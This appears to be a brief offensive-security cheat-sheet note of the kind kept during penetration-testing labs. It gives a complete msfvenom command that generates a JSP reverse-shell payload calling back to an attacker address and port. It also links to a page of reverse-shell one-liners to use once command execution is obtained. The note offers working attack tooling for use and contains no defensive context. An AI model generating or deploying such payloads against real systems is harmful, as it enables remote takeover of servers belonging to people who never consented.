# We can create our own web reverse shells with msfvenom:

msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.26 lport=1234 -f jsp > mine.jsp

# One-liner reverse shells once we have command execution:

see https://krober.biz/misc/reverse_shell.php (if we have command execution we can launch a revshell with these)
